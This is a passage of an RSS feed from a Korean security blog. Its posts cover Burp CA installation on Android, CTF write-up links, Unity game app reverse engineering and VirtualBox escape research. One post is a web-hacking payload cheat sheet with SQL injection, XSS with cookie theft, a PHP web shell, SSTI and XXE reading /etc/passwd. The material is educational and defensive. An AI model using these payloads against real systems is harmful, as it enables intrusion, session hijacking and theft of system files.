<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>JHYEON</title>
    <link>https://blog.jhyeon.dev/</link>
    
    <atom:link href="https://blog.jhyeon.dev/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>JHYEON BLOG</description>
    <pubDate>Mon, 26 Apr 2021 15:00:00 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>Android 7.0 이상의 환경에서 CA 인증서 설치</title>
      <link>https://blog.jhyeon.dev/2021/04/27/android-cert-210503/</link>
      <guid>https://blog.jhyeon.dev/2021/04/27/android-cert-210503/</guid>
      <pubDate>Mon, 26 Apr 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h2&gt;&lt;p&gt;안드로이드 빌드 7.0 이상에서 CA(Certificate Authority) 인증서를 설치 할 때,&lt;/</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>안드로이드 빌드 7.0 이상에서 CA(Certificate Authority) 인증서를 설치 할 때,</p><p>사용자 인증서로 설치하게 되면 SSL이 정상적으로 적용되지 않는 문제가 있다.</p><p>Burp Suite의 CA 인증서는 만료기간이 20년 이상의 인증서로 생성되는데,</p><p>Google에서 시스템 인증서는 39개월 이내의 만료기간을 가지기 때문에 정상적으로 동작하지 않는다.</p><p>따라서 7.0 빌드 이상의 환경이라면 시스템 루트 공간에 자격 증명을 만들어줘야 동작하게 되는데</p><p>그 과정을 정리하고자 한다.</p><h3 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h3><p>인증서는 “Burp Suite”의 <code>cacert.der</code>을 사용할 것이다.</p><ul><li><a href="http://burp/">http://burp</a></li></ul><h3 id="Hash-Extraction"><a href="#Hash-Extraction" class="headerlink" title="Hash Extraction"></a>Hash Extraction</h3><p>위 인증서를 다운로드 받았다면 인증서 변환, 해쉬 값 추출을 진행해야 한다.</p><p>OpenSSL을 사용하여 이 과정 진행이 가능하다.</p><pre><code class="bash">mv cacert.der cacert.ceropenssl x509 -inform DER -in cacert.cer -out cacert.pemopenssl x509 -inform PEM -subject_hash_old -in cacert.pem</code></pre><p>위 세가지 명령어를 입력했다면, 아래와 같은 사진을 확인할 수 있다.</p><p><img src="/img/post/android-cert/1.png" class="lazyload" data-srcset="/img/post/android-cert/1.png" srcset="data:image/png;base64,666" alt="photo1"></p><p>여기서 9a5ba575(hash는 다를 수 있음)를 복사해서 파일명을 <code>해쉬값.0</code> 으로 바꿔준다.</p><pre><code class="bash">mv cacert.pem 9a5ba575.0</code></pre><h3 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h3><p>이제 해당 인증서를 시스템 CA 인증서 디렉토리에 push 해주면 된다.</p><pre><code class="bash">adb push 9a5ba575.0 /sdcardadb shellsumount -o rw,remount /systemmv /sdcard/9a5ba575.0 /system/etc/security/cacerts/cd /system/etc/security/cacerts/chmod 644 9a5ba575.0</code></pre><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><a href="https://hackcatml.tistory.com/37">https://hackcatml.tistory.com/37</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Mobile/">Mobile</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Android/">Android</category>
      
      <category domain="https://blog.jhyeon.dev/tags/ADB/">ADB</category>
      
      <category domain="https://blog.jhyeon.dev/tags/SSL/">SSL</category>
      
      <category domain="https://blog.jhyeon.dev/tags/CA-%EC%9D%B8%EC%A6%9D%EC%84%9C/">CA 인증서</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/04/27/android-cert-210503/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>HSPACE (SatunX) CTF 2021 Write Up</title>
      <link>https://blog.jhyeon.dev/2021/04/25/hspacectf-210425/</link>
      <guid>https://blog.jhyeon.dev/2021/04/25/hspacectf-210425/</guid>
      <pubDate>Sun, 25 Apr 2021 03:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/img/post/ctf/hspace2021/logo.png&quot; class=&quot;lazylo</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p><img src="/img/post/ctf/hspace2021/logo.png" class="lazyload" data-srcset="/img/post/ctf/hspace2021/logo.png" srcset="data:image/png;base64,666" alt="photo1"></p><p>HSPACE(SatunX) 2021 (4/24 Sat 10:00 ~ 4/24 Sat 22:00 KST)</p><ul><li><a href="https://ctf.hspace.io/">https://ctf.hspace.io/</a></li><li>rank : 24th (jhye3n)</li></ul><h3 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h3><ul><li><a href="https://public.jhyeon.dev/ctf/hspace2021">https://public.jhyeon.dev/ctf/hspace2021</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/CTF/">CTF</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Pwnable/">Pwnable</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Reversing/">Reversing</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Crypto/">Crypto</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Network/">Network</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Mobile/">Mobile</category>
      
      <category domain="https://blog.jhyeon.dev/tags/SatunX/">SatunX</category>
      
      <category domain="https://blog.jhyeon.dev/tags/HSPACE/">HSPACE</category>
      
      <category domain="https://blog.jhyeon.dev/tags/HSPACE-CTF/">HSPACE CTF</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/04/25/hspacectf-210425/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>모바일 게임 앱 분석(Unity Game Engine)</title>
      <link>https://blog.jhyeon.dev/2021/04/25/unityapp-analysis-210425/</link>
      <guid>https://blog.jhyeon.dev/2021/04/25/unityapp-analysis-210425/</guid>
      <pubDate>Sun, 25 Apr 2021 01:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h3&gt;&lt;p&gt;분석에 앞서 해당 게시글은 공부용 목적으로 연구된 자료이니, 악용 목적으로는 사용을 금합니다.&lt;/p&gt;
&lt;</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p>분석에 앞서 해당 게시글은 공부용 목적으로 연구된 자료이니, 악용 목적으로는 사용을 금합니다.</p><h3 id="Unity란"><a href="#Unity란" class="headerlink" title="Unity란?"></a>Unity란?</h3><p>Unity는 게임 개발을 위한 엔진이며 2D 및 3D 게임을 만들 수 있고,</p><p>3D Animation(3D 애니메이션), VR(가상 현실), AR(증강 현실) 콘텐츠을 제작하는 용도로 사용됩니다.</p><ul><li><a href="https://unity.com/kr">https://unity.com/kr</a></li></ul><h3 id="Compiler"><a href="#Compiler" class="headerlink" title="Compiler"></a>Compiler</h3><p>Unity 엔진에는 크게 두 가지 컴파일 방식이 존재합니다.</p><ol><li>MONO Compile</li></ol><p>MONO 컴파일러의 경우 안드로이드의 JIT 컴파일 방식이라고 생각하시면 됩니다.</p><p>JIT 컴파일러는 IL(중간언어)로 작성된 DLL 파일을 읽어, Runtime으로 코드 실행을 합니다.</p><p>빠른 빌드속도와 .NET 프레임워크를 사용하기 때문에 크로스 플랫폼(Window, Linux, MacOS)에서 구동이 가능하지만, 보안에는 매우 취약합니다.</p><p>아래 MONO 컴파일러의 빌드 방식을 확인해봅시다.</p><p><img src="/img/post/unity/mono.png" class="lazyload" data-srcset="/img/post/unity/mono.png" srcset="data:image/png;base64,666" alt="photo1"></p><p>이렇게 일반적으로 컴파일 된 MONO 기반의 게임은 앱을 빌드하는 과정에서 만들어지는 <code> DLL </code> 파일을 통해서</p><p>쉽게 디컴파일이 가능하고 원본에 가까운 소스코드를 확인할 수 있게 됩니다.</p><ol start="2"><li>IL2CPP Compile</li></ol><p>IL2CPP 방식으로 컴파일 된 경우에는 약간 다른 구조를 띄고 있습니다.</p><p>아래 사진을 보면서 함께 설명을 하도록 하겠습니다.</p><p><img src="/img/post/unity/unitycompiler.png" class="lazyload" data-srcset="/img/post/unity/unitycompiler.png" srcset="data:image/png;base64,666" alt="photo2"></p><p>이렇게 보면 위에서 본 사진이랑 확연히 구분하실 수 있을겁니다.</p><p>사진의 컴파일 과정을 보면, IL2CPP 방식에는 IL Assembly 코드를 <code> il2cpp.exe </code> 에 의해서</p><p>C++ 소스코드로 변환하게 되고 이를 C++ 컴파일러에 전달하여 Native Library를 생성하는 구조입니다.</p><p>즉 JAVA에서 AOT 컴파일 방식을 의미하고 있는 것이죠.</p><p>이러한 과정으로 빌드된 APK를 내부를 분석하면 <code>lib->&#123;device-architecture&#125;</code> 경로에</p><p>3개의 Native Library가 존재함을 알 수 있습니다.</p><p><img src="/img/post/unity/nativelib.png" class="lazyload" data-srcset="/img/post/unity/nativelib.png" srcset="data:image/png;base64,666" alt="photo3"></p><p>이 라이브러리는 우선 앱이 실행될 때 <code> libunity.so </code> 를 로드하여 초기 설정값들을 얻어오고,</p><p>마지막에 <code> libil2cpp.so </code> 파일을 로드하여 앱에 정의된 메소드들을 사용하게 됩니다.</p><h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>전반적인 과정을 살펴봤으니, 실제 Unity로 개발 된 앱을 가지고 분석을 해보겠습니다.</p><p>앱에 대한 정보는 문제의 여지가 있어 공개되지 않습니다 (^_^)</p><ol><li>어플리케이션 압축 해제 후 내부 구성 파일 확인</li></ol><p><img src="/img/post/unity/app1.png" class="lazyload" data-srcset="/img/post/unity/app1.png" srcset="data:image/png;base64,666" alt="photo4"></p><ol start="2"><li>native library 확인 (unity)</li></ol><p><img src="/img/post/unity/app2.png" class="lazyload" data-srcset="/img/post/unity/app2.png" srcset="data:image/png;base64,666" alt="photo5"></p><ol start="3"><li>IL2CPPDUMPER 도구를 활용하여 앱 내부 파일 덤프</li></ol><p><img src="/img/post/unity/app3.png" class="lazyload" data-srcset="/img/post/unity/app3.png" srcset="data:image/png;base64,666" alt="photo6"></p><ol start="4"><li>Assembly-CSharp.dll 로드</li></ol><p><img src="/img/post/unity/app4.png" class="lazyload" data-srcset="/img/post/unity/app4.png" srcset="data:image/png;base64,666" alt="photo7"></p><p>실제 게임 구동을 위해 구현된 Method들을 확인할 수 있습니다.</p><ol start="5"><li>특정 메소드 RVA, Offset 확인</li></ol><p><img src="/img/post/unity/app5.png" class="lazyload" data-srcset="/img/post/unity/app5.png" srcset="data:image/png;base64,666" alt="photo8"></p><p>주어진 RVA, Offset 값을 통해, 모듈 Base 주소를 구해서 Offset 연산을 해주면,</p><p>해당 함수의 주소를 찾을 수 있어, 실제 게임 내 값을 변조하거나 하는 등의 방법도 가능하게 됩니다.</p><p>이렇게 단계별로 나눠 분석 도구를 활용해 간단하게만 분석을 해봤는데,</p><p>이후 실제 앱을 기반으로 게임 내 값을 변조한다거나 하는 방법은 정리 및 검토가 끝난 후 추가로 포스팅 하겠습니다<del>_</del></p><h3 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h3><ul><li><p><a href="https://github.com/icsharpcode/ILSpy">https://github.com/icsharpcode/ILSpy</a> (ILSPY)</p></li><li><p><a href="https://github.com/0xd4d/dnSpy">https://github.com/0xd4d/dnSpy</a> (dnSpy)</p></li><li><p><a href="https://github.com/Perfare/Il2CppDumper">https://github.com/Perfare/Il2CppDumper</a> (IL2CppDumper)</p></li></ul><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul><li>LINFORUM (<a href="http://linforum.kr/">http://linforum.kr/</a>)</li></ul>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Mobile/">Mobile</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Penetration/">Penetration</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Mobile/">Mobile</category>
      
      <category domain="https://blog.jhyeon.dev/tags/App/">App</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Unity/">Unity</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Mobile-Hacking/">Mobile Hacking</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/04/25/unityapp-analysis-210425/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Unity 엔진으로 개발 된 앱 덤프 도구</title>
      <link>https://blog.jhyeon.dev/2021/04/25/il2cppdumper-210425/</link>
      <guid>https://blog.jhyeon.dev/2021/04/25/il2cppdumper-210425/</guid>
      <pubDate>Sat, 24 Apr 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;il2cppDumper&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/Per</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><ul><li>il2cppDumper<ul><li><a href="https://github.com/Perfare/Il2CppDumper">https://github.com/Perfare/Il2CppDumper</a></li></ul></li></ul><pre><code>il2cppdumper.exe &lt;executable-file&gt; &lt;metadata.dat&gt; &lt;output-dir&gt;</code></pre>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Mobile/">Mobile</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Penetration/">Penetration</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Mobile/">Mobile</category>
      
      <category domain="https://blog.jhyeon.dev/tags/App/">App</category>
      
      <category domain="https://blog.jhyeon.dev/tags/il2cppdumper/">il2cppdumper</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/04/25/il2cppdumper-210425/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Web/Hacking Payload Docx</title>
      <link>https://blog.jhyeon.dev/2021/04/21/webpayload-210421/</link>
      <guid>https://blog.jhyeon.dev/2021/04/21/webpayload-210421/</guid>
      <pubDate>Tue, 20 Apr 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h2&gt;&lt;p&gt;해당 자료는 웹 해킹에 종류별 페이로드 문서를 정리하는 목적으로 작성된 게시글입니다.&lt;/p&gt;
&lt;p&gt;자료는</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>해당 자료는 웹 해킹에 종류별 페이로드 문서를 정리하는 목적으로 작성된 게시글입니다.</p><p>자료는 계속해서 업데이트가 되는 자료이며, 최신순을 기준으로 상단에 기록됩니다.</p><p>페이로드는 보안상 문제로 일부 변환되어 표시되며 다음 사이트에서 복호화가 가능합니다.</p><ul><li><a href="http://parkjuwan.dothome.co.kr/webapp/ltgt_conv/">http://parkjuwan.dothome.co.kr/webapp/ltgt_conv/</a></li></ul><h3 id="SQL-Injection-Basic"><a href="#SQL-Injection-Basic" class="headerlink" title="SQL Injection(Basic)"></a>SQL Injection(Basic)</h3><pre><code>&#39; or &#39;1&#39; = &#39;1&#39; or 1=1#&#39; or 1=1--or 1=1or true--or 1=1/*1′) and &#39;1′=&#39;1–admin&#39; --&#39; order by 2#&#39; union select 1,2,3,version()#&#39; union select 1,2,3,table_name from information.schema.tables#&#39; union select 1,2,3,table_name from information.schema.tables where table_name=&#39;tb_name&#39;#select count(*) from information_schema.tables where tables_schema=database();select length(table_name) from information_schema.tables where tables_schema=database() limit 0,1;select length(column_name) from table_name;select ascii(substring(table_name, 1, 1)) from informatio.schema.tables where table_schema=database(), limit 0, 1;</code></pre><h3 id="SQL-Injection-NoSQL"><a href="#SQL-Injection-NoSQL" class="headerlink" title="SQL Injection(NoSQL)"></a>SQL Injection(NoSQL)</h3><pre><code class="sql">param1[$ne]=1234&amp;param2[$ne]=0000</code></pre><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><pre><code class="html">&lt;!-- basic --&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;&amp;lt;img src=javascript:alert(1)&amp;gt;&amp;lt;img src=&quot;javascript:alert(1)&quot;&amp;gt;&amp;lt;img src=javascript:alert(String.FromCharCode(88,83,83))&amp;gt;&amp;lt;img src=x onmouseover=&quot;alert(1)&quot;&amp;gt;&amp;lt;img src=&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#39;&amp;amp;#88;&amp;amp;#83;&amp;amp;#83;&amp;amp;#39;&amp;amp;#41;&amp;gt;&amp;lt;svg onload=alert(1)&amp;gt;&amp;lt;body onload=alert(1)&amp;gt;&lt;!-- HTML CHAR --&gt;&amp;#x3c;script&amp;#x3e;alert(1)&amp;#x3c;/script&amp;#x3e;&lt;!-- UNICODE Encoding --&gt;%u003cscript%u003ealert(1)%u003c/script%u003e&lt;!-- redirect --&gt;&amp;lt;script&amp;gt;location.href=&#39;url&#39;;&amp;lt;/script&amp;gt;&amp;lt;img src=x onerror=&quot;this.src=&#39;url&#39;&quot;;/&amp;gt;&amp;lt;iframe src=&quot;data/html, urlencode_text&quot;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;!-- session hijacking --&gt;&amp;lt;script&amp;gt;location.href=&#39;url/&#39;+document.cookie;&amp;lt;/script&amp;gt;</code></pre><h3 id="WebShell"><a href="#WebShell" class="headerlink" title="WebShell"></a>WebShell</h3><pre><code class="php">&lt;?phpsystem($_GET[&#39;cmd&#39;]);?&gt;</code></pre><h3 id="WebShell-Bypass-Trick"><a href="#WebShell-Bypass-Trick" class="headerlink" title="WebShell(Bypass Trick)"></a>WebShell(Bypass Trick)</h3><ul><li><p>filename extension (php.jpg , php.png …)</p></li><li><p>gif89a, jpg, png (Insert to Image File Header)</p></li></ul><h3 id="PHP-Wrapper-Injection"><a href="#PHP-Wrapper-Injection" class="headerlink" title="PHP Wrapper Injection"></a>PHP Wrapper Injection</h3><pre><code>expect://lsphp://filter/convert.base64-encode/resource=filename</code></pre><h3 id="SSTI-Python"><a href="#SSTI-Python" class="headerlink" title="SSTI(Python)"></a>SSTI(Python)</h3><pre><code>&#123;&#123;7*7&#125;&#125;&#123;&#123;config.items()&#125;&#125;&#123;&#123; [].class.base.subclasses() &#125;&#125;&#123;&#123;''.class.mro()[1].subclasses()&#125;&#125;&#123;&#123; ''.__class__.__mro__[2].__subclasses__() &#125;&#125;</code></pre><h3 id="SSTI-Bypass-Trick"><a href="#SSTI-Bypass-Trick" class="headerlink" title="SSTI(Bypass Trick)"></a>SSTI(Bypass Trick)</h3><p><img src="/img/post/webpayload/filters.png" class="lazyload" data-srcset="/img/post/webpayload/filters.png" srcset="data:image/png;base64,666" alt="photo1"></p><ul><li>ascii encode(<a href="http://defindit.com/ascii.html">http://defindit.com/ascii.html</a>)</li></ul><h3 id="XML-Injection"><a href="#XML-Injection" class="headerlink" title="XML Injection"></a>XML Injection</h3><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE cmd [                                     &lt;!ENTITY passwd SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;                                                 &lt;cmd&gt;&amp;passwd;&lt;/cmd&gt;</code></pre><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet">https://owasp.org/www-community/xss-filter-evasion-cheatsheet</a></li><li><a href="https://github.com/payloadbox/ssti-payloads">https://github.com/payloadbox/ssti-payloads</a></li><li><a href="https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f">https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f</a></li><li><a href="https://github.com/omurugur/SQL_Injection_Payload/">https://github.com/omurugur/SQL_Injection_Payload/</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Web/">Web</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Penetration/">Penetration</category>
      
      <category domain="https://blog.jhyeon.dev/tags/OWASP/">OWASP</category>
      
      <category domain="https://blog.jhyeon.dev/tags/WebHacking/">WebHacking</category>
      
      <category domain="https://blog.jhyeon.dev/tags/webhacking-kr/">webhacking.kr</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/04/21/webpayload-210421/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>HackPackCTF 2021 Writeup</title>
      <link>https://blog.jhyeon.dev/2021/04/18/hackpackctf-210418/</link>
      <guid>https://blog.jhyeon.dev/2021/04/18/hackpackctf-210418/</guid>
      <pubDate>Sat, 17 Apr 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h3&gt;&lt;p&gt;HACKPACK CTF 2021 (4/17 Sat 01:00 ~ 4/18 Mon 01:00 KST)&lt;/p</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p>HACKPACK CTF 2021 (4/17 Sat 01:00 ~ 4/18 Mon 01:00 KST)</p><ul><li><a href="https://ctf2021.hackpack.club/team">https://ctf2021.hackpack.club/team</a></li><li>pwnhub (jhyeon, owl, 3kk, MalHyuk)</li><li>rank : 81th (400pt)</li></ul><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p>해당 게시글은 아래 노션 링크를 통해 확인하실 수 있습니다.</p><ul><li><a href="https://public.jhyeon.dev/ctf/hackpack2021">https://public.jhyeon.dev/ctf/hackpack2021</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/CTF/">CTF</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
      
      <category domain="https://blog.jhyeon.dev/tags/CTFtime/">CTFtime</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Pwn/">Pwn</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Rev/">Rev</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Crypto/">Crypto</category>
      
      <category domain="https://blog.jhyeon.dev/tags/HackPackCTF-2021/">HackPackCTF 2021</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/04/18/hackpackctf-210418/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>RITSEC-CTF 2021 Writeup</title>
      <link>https://blog.jhyeon.dev/2021/04/12/ritsec-ctf-210412/</link>
      <guid>https://blog.jhyeon.dev/2021/04/12/ritsec-ctf-210412/</guid>
      <pubDate>Sun, 11 Apr 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h3&gt;&lt;p&gt;TEAM_NAME : &lt;code&gt; pwnhub (rank 107th, 2560pt) &lt;/code&gt;&lt;/p&gt;</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p>TEAM_NAME : <code> pwnhub (rank 107th, 2560pt) </code></p><p>풀이 게시글은 아래 노션에서 확인하실 수 있습니다.</p><p><a href="https://public.jhyeon.dev/ctf/ritsec2021">https://public.jhyeon.dev/ctf/ritsec2021</a></p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
      
      <category domain="https://blog.jhyeon.dev/tags/CTFtime/">CTFtime</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Crypto/">Crypto</category>
      
      <category domain="https://blog.jhyeon.dev/tags/RITSEC-2021/">RITSEC 2021</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/04/12/ritsec-ctf-210412/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>VirtualBox Escape Research(CVE 2019-2525 &amp; 2548)</title>
      <link>https://blog.jhyeon.dev/2021/04/11/virtualboxcve-210411/</link>
      <guid>https://blog.jhyeon.dev/2021/04/11/virtualboxcve-210411/</guid>
      <pubDate>Sat, 10 Apr 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h3&gt;&lt;img src=&quot;/img/post/demon/virtualbox/team.png&quot; class=&quot;lazyloa</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><img src="/img/post/demon/virtualbox/team.png" class="lazyload" data-srcset="/img/post/demon/virtualbox/team.png" srcset="data:image/png;base64,666"><p>이번에 소속으로 활동 중인 데몬팀(DEMON TEAM) 팀 세미나 진행을 위해 “VirtualBox Research Study Team” 에서</p><p>VirtualBox Escape (CVE 2019-2525 &amp; 2548) 에 대해 연구했던 자료를 공유합니다.</p><p>발표 자료는 비공개지만, 개인 노션에 정리한 자료는 다음 링크에서 확인할 수 있습니다.</p><p><a href="https://public.jhyeon.dev/research/virtualbox">https://public.jhyeon.dev/research/virtualbox</a></p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Research/">Research</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Pwnable/">Pwnable</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Reversing/">Reversing</category>
      
      <category domain="https://blog.jhyeon.dev/tags/VirtualBox/">VirtualBox</category>
      
      <category domain="https://blog.jhyeon.dev/tags/CVE/">CVE</category>
      
      <category domain="https://blog.jhyeon.dev/tags/CVSS/">CVSS</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/04/11/virtualboxcve-210411/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>AngStormCTF 2021 Write-Up</title>
      <link>https://blog.jhyeon.dev/2021/04/10/angstormctf-210410/</link>
      <guid>https://blog.jhyeon.dev/2021/04/10/angstormctf-210410/</guid>
      <pubDate>Fri, 09 Apr 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h3&gt;&lt;p&gt;이번 CTF는 평소 친한 형들과 같이 참여를 하게 되었습니다.&lt;/p&gt;
&lt;p&gt;TEAM_NAME : &lt;cod</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p>이번 CTF는 평소 친한 형들과 같이 참여를 하게 되었습니다.</p><p>TEAM_NAME : <code> pwnhub (rank 195th, 1200pt) </code></p><p>풀이 게시글은 아래 노션에서 확인하실 수 있습니다.</p><p><a href="https://public.jhyeon.dev/ctf/angstorm2021">https://public.jhyeon.dev/ctf/angstorm2021</a></p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/CTF/">CTF</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Pwnable/">Pwnable</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Reversing/">Reversing</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Crpyto/">Crpyto</category>
      
      <category domain="https://blog.jhyeon.dev/tags/AngStormCTF-2021/">AngStormCTF 2021</category>
      
      <category domain="https://blog.jhyeon.dev/tags/CTFtime/">CTFtime</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/04/10/angstormctf-210410/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>UMassCTF&#39;21 Write Up</title>
      <link>https://blog.jhyeon.dev/2021/03/29/umassctf-210329/</link>
      <guid>https://blog.jhyeon.dev/2021/03/29/umassctf-210329/</guid>
      <pubDate>Sun, 28 Mar 2021 15:00:00 GMT</pubDate>
      
        
        
